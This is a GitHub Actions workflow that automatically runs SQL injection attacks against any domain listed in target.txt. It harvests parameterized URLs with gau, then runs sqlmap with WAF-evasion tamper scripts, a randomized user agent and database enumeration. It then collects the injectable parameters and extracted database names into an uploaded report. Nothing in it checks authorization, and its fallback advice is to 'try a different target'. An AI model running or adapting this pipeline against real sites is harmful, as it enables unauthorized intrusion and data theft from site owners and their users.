name: SQLMap Automated Scan Pipeline

on:
  workflow_dispatch:
  push:
    paths:
      - 'target.txt'

jobs:
  sqli-scan:
    runs-on: ubuntu-latest
    timeout-minutes: 180

    steps:

      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Read target domain
        id: target
        run: |
          DOMAIN=$(cat target.txt | tr -d '[:space:]')
          echo "domain=$DOMAIN" >> $GITHUB_OUTPUT
          echo "[*] Target domain: $DOMAIN"

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Install gau
        run: go install github.com/lc/gau/v2/cmd/gau@latest

      - name: Install uro
        run: pip install uro --quiet

      - name: Install sqlmap from GitHub
        run: |
          git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
          chmod +x ~/sqlmap/sqlmap.py
          python3 ~/sqlmap/sqlmap.py --version

      - name: Collect URLs with gau
        run: |
          DOMAIN="${{ steps.target.outputs.domain }}"
          echo "[*] Running gau on: $DOMAIN"
          ~/go/bin/gau \
            --threads 5 \
            --retries 3 \
            --timeout 30 \
            --blacklist png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,eot,css,js,pdf,zip \
            "$DOMAIN" > all_urls.txt
          echo "[*] Total URLs collected: $(wc -l < all_urls.txt)"

      - name: Smart filter parameterized URLs
        run: |
          grep '?' all_urls.txt | grep '=' | grep -v '\*' > step1.txt || true

          grep -vP '(\?|&)(open|cda_id|cda_arg|cda_params|redirect_data|auth_secret|castId|sub[0-9]+|click_id|device.id|cdn_cache|cfuvid|cf_bm|utm_|fbclid|gclid|msclkid|token|affiliate|aff_|ref_click|impression|campaign)=' step1.txt > step2.txt || true

          grep -vP '=[A-Za-z0-9+/\-_]{40,}' step2.txt > step3.txt || cp step2.txt step3.txt

          cat step3.txt | uro > param_urls.txt || cp step3.txt param_urls.txt

          COUNT=$(wc -l < param_urls.txt)
          echo "[*] Quality parameterized URLs: $COUNT"

          if [ "$COUNT" -eq 0 ]; then
            echo "[!] No injectable URLs found after filtering."
            echo "[!] Target likely only exposes tracking/affiliate URLs publicly."
            exit 1
          fi

          echo "[*] URLs to be tested:"
          cat param_urls.txt

      - name: Run SQLMap
        run: |
          mkdir -p sqlmap_output

          python3 ~/sqlmap/sqlmap.py \
            -m param_urls.txt \
            --batch \
            --random-agent \
            --level=3 \
            --risk=2 \
            --timeout=15 \
            --retries=3 \
            --threads=3 \
            --delay=1 \
            --tamper=between,randomcase,space2comment,charencode \
            --skip-waf \
            --dbs \
            --output-dir=sqlmap_output \
            --smart \
            --technique=BEUSTQ \
            2>&1 | tee sqlmap_output/sqlmap_full_log.txt

      - name: Parse findings into findings.txt
        if: always()
        run: |
          DOMAIN="${{ steps.target.outputs.domain }}"
          LOGFILE="sqlmap_output/sqlmap_full_log.txt"
          OUTFILE="sqlmap_output/findings.txt"

          echo "================================================" > "$OUTFILE"
          echo "  SQLMAP SCAN FINDINGS" >> "$OUTFILE"
          echo "  Target : $DOMAIN" >> "$OUTFILE"
          echo "  Date   : $(date -u)" >> "$OUTFILE"
          echo "================================================" >> "$OUTFILE"
          echo "" >> "$OUTFILE"

          if [ ! -f "$LOGFILE" ]; then
            echo "[-] Log file not found. Scan may not have run." >> "$OUTFILE"
          else
            # Check for injectable parameters
            INJECTABLE=$(grep -i "parameter.*is vulnerable\|appears to be injectable\|sqlmap identified" "$LOGFILE" || true)

            # Check for extracted databases
            DATABASES=$(grep -A 50 "available databases" "$LOGFILE" | grep -E "^\[\*\]|\[#\]|^\s+\[" | head -30 || true)

            # Check for backend DBMS info
            DBMS=$(grep -i "the back-end DBMS is\|back-end DBMS:" "$LOGFILE" | head -5 || true)

            # Check for OS/tech fingerprint
            TECH=$(grep -i "web application technology\|web server operating system" "$LOGFILE" | head -5 || true)

            # Grab all vulnerable URLs with their injection type
            VULN_URLS=$(grep -B 2 "appears to be injectable\|is vulnerable" "$LOGFILE" | grep "GET\|POST\|URL:" | sort -u || true)

            if [ -z "$INJECTABLE" ] && [ -z "$DATABASES" ]; then
              echo "[RESULT] NOTHING FOUND" >> "$OUTFILE"
              echo "" >> "$OUTFILE"
              echo "No SQL injection vulnerabilities were detected on: $DOMAIN" >> "$OUTFILE"
              echo "" >> "$OUTFILE"
              echo "Possible reasons:" >> "$OUTFILE"
              echo "  1. Target is behind Cloudflare WAF blocking all payloads" >> "$OUTFILE"
              echo "  2. No real database-backed parameters found in public URLs" >> "$OUTFILE"
              echo "  3. Parameters exist but are not injectable" >> "$OUTFILE"
              echo "" >> "$OUTFILE"
              echo "Suggestion: Try a different target or use authenticated requests via Burp." >> "$OUTFILE"
            else
              echo "[RESULT] VULNERABILITIES FOUND" >> "$OUTFILE"
              echo "" >> "$OUTFILE"

              if [ -n "$VULN_URLS" ]; then
                echo "--- VULNERABLE URLs ---" >> "$OUTFILE"
                echo "$VULN_URLS" >> "$OUTFILE"
                echo "" >> "$OUTFILE"
              fi

              if [ -n "$INJECTABLE" ]; then
                echo "--- INJECTABLE PARAMETERS ---" >> "$OUTFILE"
                echo "$INJECTABLE" >> "$OUTFILE"
                echo "" >> "$OUTFILE"
              fi

              if [ -n "$DBMS" ]; then
                echo "--- DATABASE TYPE ---" >> "$OUTFILE"
                echo "$DBMS" >> "$OUTFILE"
                echo "" >> "$OUTFILE"
              fi

              if [ -n "$DATABASES" ]; then
                echo "--- EXTRACTED DATABASES ---" >> "$OUTFILE"
                echo "$DATABASES" >> "$OUTFILE"
                echo "" >> "$OUTFILE"
              fi

              if [ -n "$TECH" ]; then
                echo "--- SERVER/TECH FINGERPRINT ---" >> "$OUTFILE"
                echo "$TECH" >> "$OUTFILE"
                echo "" >> "$OUTFILE"
              fi

              # Also copy the full CSV results if sqlmap made one
              CSV=$(find sqlmap_output -name "*.csv" 2>/dev/null | head -1)
              if [ -n "$CSV" ]; then
                echo "--- SQLMAP CSV RESULTS ---" >> "$OUTFILE"
                cat "$CSV" >> "$OUTFILE"
                echo "" >> "$OUTFILE"
              fi
            fi
          fi

          echo "================================================" >> "$OUTFILE"
          echo "" >> "$OUTFILE"
          echo "[*] Full raw log: sqlmap_output/sqlmap_full_log.txt" >> "$OUTFILE"

          echo ""
          echo "=== FINDINGS SUMMARY ==="
          cat "$OUTFILE"

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sqlmap-results-${{ steps.target.outputs.domain }}
          path: |
            sqlmap_output/findings.txt
            sqlmap_output/sqlmap_full_log.txt
            sqlmap_output/
            param_urls.txt
            all_urls.txt
          retention-days: 14
